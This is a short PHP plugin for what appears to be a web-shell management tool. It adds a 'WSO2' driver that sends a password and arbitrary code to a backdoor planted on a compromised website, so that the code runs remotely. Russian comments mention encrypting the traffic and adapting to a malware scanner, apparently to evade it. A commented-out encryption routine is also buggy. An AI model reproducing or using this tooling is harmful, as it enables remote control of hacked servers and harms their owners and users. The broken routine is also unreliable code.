<?php
/**
* WSO2
*/
class WSO2 extends BasicShell
{
	private $lasterror;
	public function exec($url, $code, $data, $password, $login) {
		$postdata = http_build_query(
			array(
				'pass' => $password,
				'a' => 'RC',
				'p1' => trim($code)
			)
		);

		return AMUtil::sendPostRequest($url, $postdata, 10);
	}
	//В перспективе лучше криптовать данные чем выключать шифрование
	//Ну нах, потом добавлю поддержка модификации айболита
	/*private function encrypt($str,$pwd){
		if($pwd==null||strlen($pwd)<=0){
			return null;
		}
		$str=base64_encode($str);
		$pwd=base64_encode($pwd);
		var $enc_chr='';
		var $enc_str='';
		var $i=0;
		while($i<strlen($str)){
			for($j=0;$j<strlen($pwd);$j++){
				$enc_chr=ord($str{$i})^ord($pwd{$i});
				$enc_str+=chr($enc_chr);
				$i++;
				if($i>=strlen($str))break;
			}
		}
		return base64_encode($enc_str);
	}*/
}
$shellManager->add("wso2", new WSO2());
?>